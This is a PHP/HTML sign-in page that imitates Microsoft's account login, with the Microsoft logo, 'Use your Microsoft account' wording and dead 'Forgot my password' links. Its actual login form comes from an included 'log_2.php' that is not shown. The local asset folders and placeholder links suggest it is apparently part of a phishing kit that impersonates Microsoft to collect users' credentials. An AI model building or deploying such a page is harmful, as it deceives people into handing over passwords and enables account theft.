<?php
// Require the MXI classes
require_once ('includes/mxi/MXI.php');
?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>Sign In</title>
<link rel="shortcut icon" href="SignIn_files/favicon.ico?v=2">

<style type="text/css">
@import url("webfonts/PlutoSansDPDLight_Web/stylesheet.css");


div {
	box-sizing:border-box;
	}

body {
	font-size: 15px;
	line-height: 20px;
	font-weight: 400;
font-size: .9375rem;
	line-height: 1.25rem;
	color: #4A4A4A;
	font-family: Tahoma, Geneva, sans-serif;
}
.container {
	display: block;
	clear: both;
	float: none;
	margin-right: 37%;
	margin-left: 37%;
}
a {
	color: #0072C6;
	text-decoration: none;
	}

input[type="color"], input[type="date"], input[type="datetime"], input[type="datetime-local"], input[type="email"], input[type="month"], input[type="number"], input[type="password"], input[type="search"], input[type="tel"], input[type="text"], input[type="time"], input[type="url"], input[type="week"], textarea, .btn  {
	border-style: solid;
	border-width: 2px;
	border-color: rgba(0,0,0,.4);
	background-color: rgba(255,255,255,.4);
	height: 32px;
	height: 2rem;
	width: 100%;
	padding-top: 4px;
	padding-right: 8px;
	padding-bottom: 4px;
	padding-left: 8px;
	box-sizing: border-box;
	margin-top: 12px;
	font-size: 14px;
}

input[type="text"]:focus {
border-color: #0078d7
}

.btn {
    background-color: #0078d7;
    border-color: #0078d7;
    color: #fff;
}
.btn:hover {
	border-top-color: #00457D;
	border-right-color: #00457D;
	border-bottom-color: #00457D;
	border-left-color: #00457D;
}
.centertext {
	text-align: center;
}
.loginHeader {
	font-size: 36px;
	margin-bottom: 40px;
	font-weight: lighter;
}
</style>
</head>

<body>
<div class="container">

    <div class="centertext">
      <p><img src="SignIn_files/AppCentipede_Microsoft.svg" /></p>
      <p>&nbsp;</p>
      <div class="loginHeader" data-bind="text: loginHeader">Sign in</div>
      <div>
        <div id="loginDescription" data-bind="                           htmlWithBindings: loginDescription,                           childBindings: { 'learnMoreLink': { click: learnMore.open, visible: !svr.BC, css: { 'display-block': !pwdView.isCombinedSISU() } } }">Use your Microsoft account.
        <br />
        
         <a href="" id="learnMoreLink" target="_top">What's this?</a></div>
      </div>
    </div>
  
  
  
  
  <?php
  mxi_includes_start("log_2.php");
  require(basename("log_2.php"));
  mxi_includes_end();
?>
  

  
  <div class="centertext">
    <p>
      
       <br />  <br />               
    No account? <a href="#">Create one! </a></p>
    <p>  <br />  <a href="#">Forgot my password</a><br /> <br /> 
      <a href="#">Sign in with a single-use code</a><br />
     <br /><br /> 
    Microsoft  </p>
  </div>                
</div>

</body>
</html>